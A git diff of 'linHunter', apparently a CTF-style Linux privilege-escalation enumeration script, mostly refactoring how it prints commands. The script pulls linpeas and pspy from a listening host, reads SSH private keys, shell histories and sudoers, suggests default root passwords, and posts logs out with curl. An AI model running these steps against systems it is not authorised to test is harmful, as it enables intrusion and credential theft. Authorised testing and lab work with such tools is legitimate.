@@ -1,6 +1,6 @@
 #!/bin/bash
 # 
-# Version:              1.2
+# Version:              1.3
 # linHunter Author:     Mithlonde Last updated: 
 # Creation Date:        07/03/2024
 # Website:              https://github.com/Mithlonde/Hunter
@@ -16,6 +16,8 @@ NC="${C}[0m" # Neutral Color
 script_name=$(basename "$0")
 output_file_name="$(basename "$script_name" .sh).log"  # Removes .sh extension and appends .log
 CWD=$(pwd)
+#CWD=$(echo "$PWD" | sed "s|^$HOME|~|") If you want to display it as ~/Home/User/..
+echo_command="${RED}$(whoami)@$(hostname)${NC}:${WHITE}${CWD}${NC}\$"
 
 ###########################################
 #---------------) Header (----------------#
@@ -28,9 +30,10 @@ echo " | | | '_ \ / /_/ / | | | '_ \| __/ _ \ '__| "
 echo " | | | | | / __  /| |_| | | | | ||  __/ |    "
 echo " |_|_|_| |_\/ /_/  \__,_|_| |_|\__\___|_|    " 
 echo ""
-echo "          Linux PrivEsc Hunter V1.2          "
+echo "          Linux PrivEsc Hunter V1.3          "
 echo "                by Mithlonde                 "
-echo ""
+echo "" 
+# https://www.patorjk.com/software/taag/#p=display&f=Ogre&t=linHunter
 
 ###########################################
 #-------------) Help Legend (-------------#
@@ -138,7 +141,7 @@ download_tools() {
     if [ "$method" == "http" ]; then
         # Attempt to download files using wgetcd te
         if timeout 3 wget -q http://"$listening_host"/linpeas.sh http://"$listening_host"/pspy64; then
-            echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}wget http://$listening_host/linpeas.sh http://$listening_host/pspy64${NC}"
+            echo -e "$echo_command ${BLUE}wget http://$listening_host/linpeas.sh http://$listening_host/pspy64${NC}"
             echo -e "Downloaded: ${BLUE}linpeas.sh${NC}"
             echo -e "Downloaded: ${BLUE}pspy64${NC}"
             echo "${YELLOW}Files downloaded successfully${NC}"
@@ -195,7 +198,7 @@ upload_logs() {
         if [ -f "$file" ]; then
             # Attempt to upload files using curl
             if curl -X POST http://"$listening_host":8000/upload -F "files=@$file" 2>/dev/null; then
-            echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}curl -X POST http://$listening_host:8000/upload -F \"files=@$file\"${NC}"
+            echo -e "$echo_command ${BLUE}curl -X POST http://$listening_host:8000/upload -F \"files=@$file\"${NC}"
             echo -e "Uploaded: ${BLUE}$file${NC}"
             ((num_uploaded++))
             fi
@@ -229,11 +232,8 @@ upload_logs() {
 manual_enumeration() {
     start_time=$(date +%s)
     echo -e "${YELLOW}[+] ${WHITE}Performing manual enumeration...${NC}"
-    echo "Ensuring ll environment variable is available..."
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}alias ll=\"ls -laht --color=auto\"${NC}"
-    alias ll="ls -laht --color=auto" # use as $ll in this script
     # Checking username and hostname    
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}whoami ; id ; hostname ; ip a${NC}"
+    echo -e "$echo_command ${BLUE}whoami ; id ; hostname ; ip a${NC}"
     whoami ; id ; hostname ; ip a
     # Checking for flags (loop)
     flag_files=("user.txt" "root.txt" "local.txt" "proof.txt")
@@ -242,127 +242,127 @@ manual_enumeration() {
         result=$(find / -name "$file" 2>/dev/null)
         # Check if any result is found
         if [ -n "$result" ]; then
-            echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}find / -name $file 2>/dev/null${NC}"
+            echo -e "$echo_command ${BLUE}find / -name $file 2>/dev/null${NC}"
             # Display the full path of the file using pwd and cat
             while IFS= read -r line; do
                 echo "$line"
-                echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}cat $line${NC}"
+                echo -e "$echo_command ${BLUE}cat $line${NC}"
                 cat "$line"
             done <<< "$result"
         fi
     done    
     # Checking operating system, version and architecture
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}file /bin/bash ; arch ; lsb_release -a ; uname -a ; sudo --version${NC}"
+    echo -e "$echo_command ${BLUE}file /bin/bash ; arch ; lsb_release -a ; uname -a ; sudo --version${NC}"
     file /bin/bash ; arch ; lsb_release -a ; uname -a ; sudo --version
     # Checking history privileges
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}history${NC}"
+    echo -e "$echo_command ${BLUE}history${NC}"
     cat ~/.bash_history ~/.sh_history ~/.zsh_history
     # Checking additional history 
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}cat ~/.atftp_history ~/.mysql_history ~/.php_history${NC}"
+    echo -e "$echo_command ${BLUE}cat ~/.atftp_history ~/.mysql_history ~/.php_history${NC}"
     cat ~/.atftp_history ~/.mysql_history ~/.php_history
     # Checking privileges
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}sudo -l -n ; cat /etc/sudoers${NC}"
+    echo -e "$echo_command ${BLUE}sudo -l -n ; cat /etc/sudoers${NC}"
     sudo -l -n ; cat /etc/sudoers
     # Checking existing users and groups
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}grep -vE \"nologin|false\" /etc/passwd ; ll /etc/passwd /etc/shadow ; groups $USER${NC}"
-    grep -vE "nologin|false" /etc/passwd ; $ll /etc/passwd /etc/shadow ; groups $USER
+    echo -e "$echo_command ${BLUE}grep -vE \"nologin|false\" /etc/passwd ; ls -laht /etc/passwd /etc/shadow ; groups $USER${NC}"
+    grep -vE "nologin|false" /etc/passwd ; ls -laht /etc/passwd /etc/shadow ; groups $USER
     # Checking home directories
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ll /home /root${NC}"
-    $ll /home /root
+    echo -e "$echo_command ${BLUE}ls -laht /home /root${NC}"
+    ls -laht /home /root
     # Checking private-key information
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ll ~/.ssh ; cat ~/.ssh/* ; find / -name authorized_keys 2> /dev/null ; find / -name id_rsa 2> /dev/null${NC}"
-    $ll ~/.ssh ; cat ~/.ssh/* ; find / -name authorized_keys 2> /dev/null ; find / -name id_rsa 2> /dev/null
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}cat /etc/ssh/*_config | grep 'AllowUsers'${NC}"
-    cat /etc/ssh/*_config | grep 'AllowUsers'
+    echo -e "$echo_command ${BLUE}ls -laht ~/.ssh ; cat ~/.ssh/* ; find / -name authorized_keys 2> /dev/null ; find / -name id_rsa 2> /dev/null${NC}"
+    ls -laht ~/.ssh ; cat ~/.ssh/* ; find / -name authorized_keys 2> /dev/null ; find / -name id_rsa 2> /dev/null
+    echo -e "$echo_command ${BLUE}cat /etc/ssh/*_config${NC}"
+    cat /etc/ssh/*_config
     # Checking if SSH directory symlink is possible (Requires cp \* as a backup cronjob)
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}cat /etc/ssh/*_config | grep 'PermitRoot'${NC}"
+    echo -e "$echo_command ${BLUE}cat /etc/ssh/*_config | grep 'PermitRoot'${NC}"
     echo -e "${YELLOW}[!] Tip: \"PermitRootLogin without-password\" + cp \\* as a backup cronjob = SSH directory symlink to root${NC}"    
     cat /etc/ssh/*_config | grep 'PermitRoot'
     # Checking SUIDs and GUIDs
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}find / -perm -u=s -type f 2>/dev/null${NC}"
+    echo -e "$echo_command ${BLUE}find / -perm -u=s -type f 2>/dev/null${NC}"
     echo -e "${YELLOW}[!] Tip: Any vulnerable SUIDs (see https://gtfobins.github.io/)?${NC}"
     find / -perm -u=s -type f 2>/dev/null
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}find / -perm -g=s -type f 2>/dev/null${NC}"
+    echo -e "$echo_command ${BLUE}find / -perm -g=s -type f 2>/dev/null${NC}"
     echo -e "${YELLOW}[!] Tip: Any vulnerable GUIDs (see https://gtfobins.github.io/)?${NC}"
     find / -perm -g=s -type f 2>/dev/null
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}getcap -r / 2>/dev/null${NC}"
+    echo -e "$echo_command ${BLUE}getcap -r / 2>/dev/null${NC}"
     echo -e "${YELLOW}[!] Tip: Anything with cap_setuid+ep (see https://gtfobins.github.io/)?${NC}"
     getcap -r / 2>/dev/null
     # Check if netstat is available
     if command -v netstat &>/dev/null; then
-        echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}netstat -antup${NC}"
+        echo -e "$echo_command ${BLUE}netstat -antup${NC}"
         echo -e "${YELLOW}[!] Tip: Anything running locally we can login to? Example: mysql -u root -p (try root/toor/null)${NC}"
         netstat -antup
     else
         ss -tunlp
-        echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ss -tunlp${NC}"
+        echo -e "$echo_command ${BLUE}ss -tunlp${NC}"
         echo -e "${YELLOW}[!] Tip: Anything running locally we can login to? Example: mysql -u root -p (try root/toor/null)${NC}"
     fi
     # Checking website database files
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ll /srv /srv/www /var /var/www /var/www/html${NC}"
+    echo -e "$echo_command ${BLUE}ls -laht /srv /srv/www /var /var/www /var/www/html${NC}"
     echo -e "${YELLOW}[!] Tip: Any web configs containing credentials?${NC}"
     echo "/srv:"
-    $ll /srv 
+    ls -laht /srv 
     echo ""
     echo "/srv/www:"
-    $ll /srv/www 
+    ls -laht /srv/www 
     echo ""
     echo "/var:"
-    $ll /var
+    ls -laht /var
     echo ""
     echo "/var/www:"
-    $ll /var/www 
+    ls -laht /var/www 
     echo ""
     echo "var/www/html:"
-    $ll /var/www/html
+    ls -laht /var/www/html
     # Checking other databases
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ll /var/lib/pgsql /var/lib/mysql${NC}"
-    $ll /var/lib/pgsql /var/lib/mysql
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}dpkg -l | grep -i 'mysql' --colour=auto${NC}"
+    echo -e "$echo_command ${BLUE}ls -laht /var/lib/pgsql /var/lib/mysql${NC}"
+    ls -laht /var/lib/pgsql /var/lib/mysql
+    echo -e "$echo_command ${BLUE}dpkg -l | grep -i 'mysql' --colour=auto${NC}"
     echo -e "${YELLOW}[!] Tip: searchsploit mysql <version> linux privilege escalation${NC}"
     dpkg -l | grep -i 'mysql' --colour=auto
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ps aux |grep -i 'root' --color=auto${NC}"
+    echo -e "$echo_command ${BLUE}ps aux |grep -i 'root' --color=auto${NC}"
     echo -e "${YELLOW}[!] Tip: Is anything vulnerable running as root?${NC}"
     ps aux |grep -i 'root' --color=auto
     # Checking world writables
-    #echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}find / -writable -type d 2>/dev/null${NC}"
+    #echo -e "$echo_command ${BLUE}find / -writable -type d 2>/dev/null${NC}"
     #find / -writable -type d 2>/dev/null # <----- Uncommented because it gives too much output, check linpeas.log instead!
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ll /opt /tmp /var/tmp /dev/shm${NC}"
+    echo -e "$echo_command ${BLUE}ls -laht /opt${NC}"
     echo "/opt:"
-    $ll /opt
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ll /tmp /var/tmp /dev/shm${NC}"
+    ls -laht /opt
+    echo -e "$echo_command ${BLUE}ls -laht /tmp /var/tmp /dev/shm${NC}"
     echo -e "${YELLOW}[!] Tip: Where can I read, write and execute files?${NC}"
     echo "/tmp:"
-    $ll /tmp
+    ls -laht /tmp
     echo ""
     echo "/var/tmp:"
-    $ll /var/tmp
+    ls -laht /var/tmp
     echo ""
     echo "/dev/shm:"
-    $ll /dev/shm
+    ls -laht /dev/shm
     # Checking var
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ll /var/log${NC}"
+    echo -e "$echo_command ${BLUE}ls -laht /var/log${NC}"
     echo -e "/var/log:"
-    $ll /var/log
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}ll /var/mail /var/spool/mail${NC}"
+    ls -laht /var/log
+    echo -e "$echo_command ${BLUE}ls -laht /var/mail /var/spool/mail${NC}"
     echo "/var/mail:"
-    $ll /var/mail
+    ls -laht /var/mail
     echo ""
     echo "/var/spool/mail:"
-    $ll /var/spool/mail
+    ls -laht /var/spool/mail
     # Checking NFS
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}cat /etc/exports${NC}"
+    echo -e "$echo_command ${BLUE}cat /etc/exports${NC}"
     echo -e "${YELLOW}[!] Tip: NFS? Can we exploit weak NFS Permissions?${NC}"
     cat /etc/exports
     # Checking Cronjobs
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}cat /etc/crontab ; ls /etc/cron.*${NC}"
+    echo -e "$echo_command ${BLUE}cat /etc/crontab ; ls /etc/cron.*${NC}"
     echo -e "${YELLOW}[!] Tip: Check your pspy!${NC}"
     cat /etc/crontab ; ls /etc/cron.*
     # Checking mounts
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}mount${NC}"
+    echo -e "$echo_command ${BLUE}mount${NC}"
     echo -e "${YELLOW}[!] Tip: How are file-systems mounted?${NC}"
     mount
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}cat /etc/fstab${NC}"
+    echo -e "$echo_command ${BLUE}cat /etc/fstab${NC}"
     echo -e "${YELLOW}[!] Tip: Are there any unmounted file-systems?${NC}"
     cat /etc/fstab
     echo ""
@@ -395,9 +395,9 @@ auto_enum_plus_redirect() {
     start_time=$(date +%s)
     echo -e "${YELLOW}[+] ${WHITE}Running linpeas.sh. Please wait ±5 minutes...${NC}"
     echo -e "Ensuring that 'linpeas.sh' is executable..."
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}chmod +x linpeas.sh${NC}"
+    echo -e "$echo_command ${BLUE}chmod +x linpeas.sh${NC}"
     chmod +x linpeas.sh
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}./linpeas.sh > linpeas.log 2>&1 &${NC}"
+    echo -e "$echo_command ${BLUE}./linpeas.sh > linpeas.log 2>&1 &${NC}"
     ./linpeas.sh > linpeas.log 2>&1 & 
 
     # Wait for linpeas.sh to finish
@@ -414,9 +414,9 @@ auto_enum_plus_redirect() {
     start_time=$(date +%s)
     echo -e "${YELLOW}[+] ${WHITE}Running pspy64 and automatically terminates in 5 minutes, please wait...${NC}"
     echo -e "Ensuring that 'pspy64' is executable..."
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}chmod +x pspy64${NC}"
+    echo -e "$echo_command ${BLUE}chmod +x pspy64${NC}"
     chmod +x pspy64
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}./pspy64 > pspy.log 2>&1 &${NC}"
+    echo -e "$echo_command ${BLUE}./pspy64 > pspy.log 2>&1 &${NC}"
     ./pspy64 > pspy64.log 2>&1 &
     pspy_pid=$(pgrep -f "pspy64")
 
@@ -440,9 +440,9 @@ auto_minus_redirect() {
     start_time=$(date +%s)
     echo -e "${YELLOW}[+] ${WHITE}Running linpeas.sh. Please wait ±5 minutes...${NC}"
     echo -e "Ensuring that 'linpeas.sh' is executable..."
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}chmod +x linpeas.sh${NC}"
+    echo -e "$echo_command ${BLUE}chmod +x linpeas.sh${NC}"
     chmod +x linpeas.sh
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}./linpeas.sh${NC}"
+    echo -e "$echo_command ${BLUE}./linpeas.sh${NC}"
     ./linpeas.sh
 
     # Wait for linpeas.sh to finish
@@ -459,9 +459,9 @@ auto_minus_redirect() {
     start_time=$(date +%s)
     echo -e "${YELLOW}[+] ${WHITE}}Running pspy64 and automatically terminates in 5 minutes, please wait...${NC}"
     echo -e "Ensuring that 'pspy64' is executable..."
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}chmod +x pspy64${NC}"
+    echo -e "$echo_command ${BLUE}chmod +x pspy64${NC}"
     chmod +x pspy64
-    echo -e "${RED}$(whoami)@$(hostname)${WHITE}:${CWD}: ${BLUE}timeout 300 ./pspy64${NC}"
+    echo -e "$echo_command ${BLUE}timeout 300 ./pspy64${NC}"
     timeout 300 ./pspy64 # Terminate automatically after 5 minutes
 
     end_time=$(date +%s)
